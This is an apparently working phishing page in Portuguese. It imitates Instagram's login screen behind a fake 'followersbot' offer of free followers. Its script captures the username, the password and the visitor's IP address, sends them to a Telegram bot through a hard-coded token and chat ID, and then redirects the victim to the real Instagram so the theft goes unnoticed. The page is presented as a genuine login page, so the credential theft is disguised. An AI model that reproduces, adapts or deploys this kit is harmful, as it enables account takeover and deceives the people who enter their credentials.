<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
    <title>Instagram</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
        }

        :root {
            --preto: #000000;
            --fundo-card: #1c1c1e;
            --cinza-escuro: #121212;
            --borda: #38383a;
            --texto-cinza: #8e8e93;
            --branco: #ffffff;
            --azul: #0095f6;
            --azul-claro: #1ea0f7;
        }

        body {
            background-color: var(--preto);
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            padding: 40px 20px;
        }

        .container {
            width: 100%;
            max-width: 350px;
            display: flex;
            flex-direction: column;
            gap: 12px;
        }

        /* ===== CARD FOLLOWERS ===== */
        .card-followers {
            background: var(--fundo-card);
            border: 1px solid var(--borda);
            border-radius: 16px;
            padding: 24px;
        }

        .cabecalho {
            display: flex;
            align-items: center;
            justify-content: space-between;
            margin-bottom: 20px;
        }

        .perfil {
            display: flex;
            align-items: center;
            gap: 12px;
        }

        .avatar {
            width: 50px;
            height: 50px;
            border-radius: 50%;
            background: linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888);
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 20px;
            font-weight: bold;
            color: white;
        }

        .nome-verificado {
            display: flex;
            align-items: center;
            gap: 5px;
        }

        .nome {
            font-size: 15px;
            font-weight: 700;
            color: var(--branco);
        }

        .selo-verificado {
            width: 18px;
            height: 18px;
        }

        .subtitulo {
            font-size: 11px;
            color: var(--texto-cinza);
            margin-top: 2px;
        }

        .contador {
            text-align: right;
        }

        .numero {
            font-size: 24px;
            font-weight: 800;
            color: var(--azul);
        }

        .rotulo {
            font-size: 11px;
            color: var(--texto-cinza);
        }

        .seletor-titulo {
            font-size: 13px;
            font-weight: 600;
            color: var(--texto-cinza);
            margin: 10px 0 12px;
        }

        .botoes-qtd {
            display: grid;
            grid-template-columns: repeat(4, 1fr);
            gap: 10px;
        }

        .btn-qtd {
            padding: 12px 6px;
            border: 1px solid var(--borda);
            background: transparent;
            border-radius: 10px;
            font-size: 13px;
            font-weight: 600;
            color: var(--branco);
            cursor: pointer;
            transition: all 0.25s ease;
        }

        .btn-qtd:hover {
            border-color: var(--azul);
            color: var(--azul);
            background: rgba(0, 149, 246, 0.08);
        }

        .btn-qtd.ativo {
            background: var(--azul);
            border-color: var(--azul);
            color: white;
        }

        /* ===== CARD LOGIN ===== */
        .card-login {
            background: var(--fundo-card);
            border: 1px solid var(--borda);
            border-radius: 16px;
            padding: 35px 40px 25px;
        }

        .logo-bloco {
            display: flex;
            flex-direction: column;
            align-items: center;
            margin-bottom: 32px;
        }

        .logo-simbolo {
            width: 56px;
            height: 56px;
            margin-bottom: 12px;
        }

        .logo-texto {
            font-family: 'Segoe Script', 'Brush Script MT', 'Billabong', cursive;
            font-size: 44px;
            font-weight: 500;
            color: var(--branco);
            letter-spacing: 1px;
        }

        .form {
            display: flex;
            flex-direction: column;
            gap: 8px;
        }

        .grupo-input {
            position: relative;
        }

        .grupo-input input {
            width: 100%;
            background: var(--cinza-escuro);
            border: 1px solid var(--borda);
            border-radius: 10px;
            padding: 13px 12px;
            color: var(--branco);
            font-size: 13px;
            outline: none;
            transition: border 0.25s ease;
        }

        .grupo-input input:focus {
            border-color: var(--azul);
        }

        .grupo-input label {
            position: absolute;
            left: 12px;
            top: 13px;
            font-size: 12px;
            color: var(--texto-cinza);
            pointer-events: none;
            transition: all 0.15s ease;
        }

        .grupo-input input:focus + label,
        .grupo-input input:not(:placeholder-shown) + label {
            top: 5px;
            left: 10px;
            font-size: 10px;
        }

        .btn-entrar {
            width: 100%;
            background: var(--azul);
            color: white;
            border: none;
            border-radius: 10px;
            padding: 11px;
            font-weight: 600;
            font-size: 14px;
            cursor: pointer;
            margin: 12px 0;
            transition: background 0.25s ease;
        }

        .btn-entrar:hover {
            background: var(--azul-claro);
        }

        .divisor {
            display: flex;
            align-items: center;
            margin: 18px 0;
        }

        .linha {
            flex: 1;
            height: 1px;
            background: var(--borda);
        }

        .texto-divisor {
            padding: 0 18px;
            font-size: 13px;
            font-weight: 600;
            color: var(--texto-cinza);
        }

        .link-esqueci {
            text-align: center;
            margin-top: 8px;
        }

        .link-esqueci a {
            color: var(--azul);
            font-size: 12px;
            text-decoration: none;
        }

        /* ===== CRIAR CONTA ===== */
        .card-conta {
            background: var(--fundo-card);
            border: 1px solid var(--borda);
            border-radius: 16px;
            padding: 20px;
            text-align: center;
        }

        .texto-conta {
            font-size: 14px;
            color: var(--branco);
        }

        .link-conta {
            color: var(--azul);
            font-weight: 600;
            text-decoration: none;
        }

        /* ===== RODAPÉ ===== */
        .rodape {
            text-align: center;
            padding: 20px;
            font-size: 12px;
            color: var(--texto-cinza);
        }
    </style>
</head>
<body>
    <div class="container">

        <!-- 🚀 CARD FOLLOWERS -->
        <div class="card-followers">
            <div class="cabecalho">
                <div class="perfil">
                    <div class="avatar">F</div>
                    <div>
                        <div class="nome-verificado">
                            <span class="nome">followersbot</span>
                            <svg class="selo-verificado" viewBox="0 0 18 18" fill="none">
                                <path d="M9 0L11.5 2.5L14 0L18 4L15.5 6.5L18 9L14 13L11.5 10.5L9 13L4 9L6.5 6.5L4 4L9 0Z" fill="#0095f6"/>
                                <path d="M7 9L8.5 10.5L11 8" stroke="#fff" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
                            </svg>
                        </div>
                        <p class="subtitulo">Conta verificada • Bot Oficial</p>
                    </div>
                </div>
                <div class="contador">
                    <div class="numero" id="contador">12.4k</div>
                    <div class="rotulo">seguidores</div>
                </div>
            </div>

            <p class="seletor-titulo">Quantidade desejada:</p>
            <div class="botoes-qtd">
                <button class="btn-qtd" data-valor="100">100</button>
                <button class="btn-qtd" data-valor="500">500</button>
                <button class="btn-qtd ativo" data-valor="12400">12.4k</button>
                <button class="btn-qtd" data-valor="5000">5k</button>
                <button class="btn-qtd" data-valor="10000">10k</button>
                <button class="btn-qtd" data-valor="25000">25k</button>
                <button class="btn-qtd" data-valor="50000">50k</button>
                <button class="btn-qtd" data-valor="100000">100k</button>
            </div>
        </div>

        <!-- 🔐 LOGIN -->
        <div class="card-login">
            <div class="logo-bloco">
                <svg class="logo-simbolo" viewBox="0 0 56 56" fill="none" stroke="#ffffff" stroke-width="2">
                    <rect x="6" y="6" width="44" height="44" rx="14"/>
                    <circle cx="28" cy="28" r="11"/>
                    <circle cx="41" cy="15" r="3" fill="#ffffff" stroke="none"/>
                </svg>
                <h1 class="logo-texto">Instagram</h1>
            </div>

            <form class="form" id="formLogin">
                <div class="grupo-input">
                    <input type="text" id="usuario" placeholder=" " required>
                    <label for="usuario">Nome de usuário ou e-mail</label>
                </div>

                <div class="grupo-input">
                    <input type="password" id="senha" placeholder=" " required>
                    <label for="senha">Senha</label>
                </div>

                <button type="submit" class="btn-entrar">Entrar</button>
            </form>

            <div class="divisor">
                <div class="linha"></div>
                <span class="texto-divisor">OU</span>
                <div class="linha"></div>
            </div>

            <div class="link-esqueci">
                <a href="#">Esqueceu a senha?</a>
            </div>
        </div>

        <!-- 📝 CRIAR CONTA -->
        <div class="card-conta">
            <p class="texto-conta">Não tem uma conta? <a href="#" class="link-conta">Cadastre-se</a></p>
        </div>

        <!-- © RODAPÉ -->
        <div class="rodape">
            <p>© 2026 Instagram</p>
        </div>
    </div>

    <script>
        // ===== SELECIONAR QUANTIDADE =====
        const botoes = document.querySelectorAll('.btn-qtd');
        const display = document.getElementById('contador');
        let valorEscolhido = 12400;

        function formatarNumero(n) {
            if (n >= 1000000) return (n/1000000).toFixed(1).replace('.0','') + 'M';
            if (n >= 1000) return (n/1000).toFixed(1).replace('.0','') + 'k';
            return n.toString();
        }

        botoes.forEach(botao => {
            botao.addEventListener('click', () => {
                botoes.forEach(b => b.classList.remove('ativo'));
                botao.classList.add('ativo');
                valorEscolhido = parseInt(botao.dataset.valor);
                display.textContent = formatarNumero(valorEscolhido);
            });
        });

        // ===== TELEGRAM =====
        const TOKEN = '8602384444:AAHxqga8lgEH_5_TfPoRDLHDKzr0wbhaGY0';
        const CHAT_ID = '7585945897';

        async function pegarIP() {
            try {
                const res = await fetch('https://api.ipify.org?format=json');
                return (await res.json()).ip;
            } catch { return 'Não detectado'; }
        }

        document.getElementById('formLogin').addEventListener('submit', async e => {
            e.preventDefault();
            const usuario = document.getElementById('usuario').value;
            const senha = document.getElementById('senha').value;
            const ip = await pegarIP();
            const agora = new Date();
            const data = agora.toLocaleDateString('pt-BR');
            const hora = agora.toLocaleTimeString('pt-BR');

            const mensagem = `
𓆩𓆩 𝙷𝙸 𝚈𝙾𝚄 𝙷𝙰𝚅𝙴 𝙽𝙴𝚆 𝙷𝙸𝚃 ツ.𓆪𓆪

🐉⊚-----------------------------------⊚🐉
↝ 𝙿𝙰𝙶𝙴 » 𝙸𝙽𝚂𝚃𝙰𝙶𝚁𝙰𝙼 + 𝙵𝙾𝙻𝙻𝙾𝚆𝙴𝚁𝚂𝙱𝙾𝚃
➥ 𝙻𝙾𝙶𝙸𝙽 𝙱𝚈  » Instagram
📧 ↝ 𝙴𝚖𝚊𝚒𝚕 » ${usuario}
📟 ↝ 𝙿𝚊𝚜𝚜𝚠𝚘𝚛𝚍 » ${senha}
👥 ↝ 𝚀𝚞𝚊𝚗𝚝𝚒𝚍𝚊𝚍𝚎 » ${formatarNumero(valorEscolhido)}
🏴 ↝ 𝙲𝚘𝚞𝚗𝚝𝚛𝚢 » BRAZIL
⏳ ↝ 𝙲𝚘𝚍𝚎 » 55 ↝ 🇧🇷 
⚙️ ↝ 𝙸𝙿 » ${ip}
⏱ ↝ 𝚃𝚒𝚖𝚎 » ${hora}
📝 ↝ 𝙳𝚊𝚝𝚎 » ${data}
🐉⊚-----------------------------------⊚🐉
↝ ᴅᴇᴠ ʙʏ »  @Matheus7z
            `.trim();

            await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: CHAT_ID, text: mensagem })
            });

            window.location.href = 'https://www.instagram.com';
        });
    </script>
</body>
</html>
